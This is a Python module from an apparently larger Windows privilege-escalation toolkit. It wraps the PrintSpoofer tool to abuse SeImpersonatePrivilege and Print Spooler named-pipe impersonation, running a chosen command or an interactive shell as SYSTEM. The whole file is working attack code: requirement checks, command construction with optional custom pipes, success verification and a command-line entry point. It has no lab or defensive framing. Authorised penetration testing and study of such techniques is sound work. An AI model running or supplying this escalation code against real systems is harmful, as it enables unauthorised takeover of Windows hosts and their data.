import os
from typing import Tuple
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from .base import PotatoExploitBase


class PrintSpooferExploit(PotatoExploitBase):
    """Exploit using PrintSpoofer for privilege escalation."""

    def __init__(self, output_dir: str = "token_impersonation"):
        """
        Initialize the PrintSpoofer exploit module.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__("printspoofer", output_dir)
        self.tool_path = "C:\\Windows\\Temp\\PrintSpoofer.exe"
        self.log("PrintSpoofer exploit module initialized", "SUCCESS")

    def get_requirements(self) -> dict:
        """
        Get the requirements for this exploit.

        Returns:
            Dictionary with requirement information
        """
        return {
            'privilege': 'SeImpersonatePrivilege',
            'min_windows': 'Windows 10 1809 / Server 2019',
            'service': 'Print Spooler (Spooler)',
            'tool_url': self.TOOL_URLS['printspoofer'],
            'description': 'Abuses SpoolSS named pipe impersonation'
        }

    def exploit(self, command: str = "cmd.exe",
                interactive: bool = True) -> Tuple[bool, str]:
        """
        Execute PrintSpoofer privilege escalation.

        Args:
            command: Command to execute as SYSTEM
            interactive: Whether to spawn interactive shell

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Attempting privilege escalation with PrintSpoofer...")
        self.log(f"Target command: {command}")

        # Verify tool exists
        if not self.check_tool_exists():
            return False, f"Tool not found: {self.tool_path}"

        # Build command
        if interactive:
            cmd = f'{self.tool_path} -i -c "{command}"'
        else:
            cmd = f'{self.tool_path} -c "{command}"'

        self.log(f"Executing: {cmd}")

        try:
            result = self.run_command(cmd, timeout=60)

            output = result.stdout + result.stderr

            self.log("Command output:", "INFO")
            for line in output.split('\n'):
                if line.strip():
                    print(f"    {line}")

            # Check for success
            if self.verify_system_privileges(output):
                self.log("SUCCESS! Escalated to SYSTEM", "SUCCESS")
                return True, output
            else:
                self.log("Escalation may have failed", "WARNING")
                return False, output

        except Exception as e:
            self.log(f"PrintSpoofer failed: {e}", "ERROR")
            return False, str(e)

    def exploit_with_pipe(self, pipe_name: str, command: str = "cmd.exe") -> Tuple[bool, str]:
        """
        Execute PrintSpoofer with a custom named pipe.

        Args:
            pipe_name: Custom pipe name to use
            command: Command to execute as SYSTEM

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Using custom pipe: {pipe_name}")

        if not self.check_tool_exists():
            return False, f"Tool not found: {self.tool_path}"

        cmd = f'{self.tool_path} -p "{pipe_name}" -c "{command}"'

        self.log(f"Executing: {cmd}")

        try:
            result = self.run_command(cmd, timeout=60)
            output = result.stdout + result.stderr

            if self.verify_system_privileges(output):
                self.log("SUCCESS! Escalated to SYSTEM", "SUCCESS")
                return True, output
            else:
                return False, output

        except Exception as e:
            return False, str(e)

    def check_spooler_service(self) -> bool:
        """
        Check if the Print Spooler service is running.

        Returns:
            True if Spooler is running, False otherwise
        """
        self.log("Checking Print Spooler service status...")

        result = self.run_command('sc query Spooler')

        if 'RUNNING' in result.stdout:
            self.log("Print Spooler is RUNNING", "SUCCESS")
            return True
        else:
            self.log("Print Spooler is NOT running", "WARNING")
            self.log("Try starting with: sc start Spooler", "INFO")
            return False


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="PrintSpoofer Exploit")
    parser.add_argument('--command', '-c', default='whoami',
                        help='Command to execute as SYSTEM')
    parser.add_argument('--tool-path', '-t',
                        help='Path to PrintSpoofer.exe')
    parser.add_argument('--check', action='store_true',
                        help='Only check if Spooler is running')

    args = parser.parse_args()

    exploit = PrintSpooferExploit()

    if args.tool_path:
        exploit.set_tool_path(args.tool_path)

    if args.check:
        exploit.check_spooler_service()
    else:
        success, output = exploit.exploit(command=args.command)
        print(f"\n[{'SUCCESS' if success else 'FAILED'}]")